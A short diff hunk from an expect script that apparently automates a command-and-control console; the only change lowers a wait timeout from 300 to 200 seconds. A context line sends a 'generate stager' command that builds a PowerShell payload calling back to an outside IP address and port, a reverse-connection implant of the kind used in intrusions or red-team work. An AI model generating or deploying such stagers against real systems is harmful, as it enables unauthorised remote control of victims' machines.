@@ -31,7 +31,7 @@ send "jobs\r"
 send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format ps1 --save $payload_c\r"
 
 # Wait for the file $payload_c to exist
-set timeout 300
+set timeout 200
 expect {
     timeout {
         puts "Error: Timed out waiting for $payload_c to be generated."
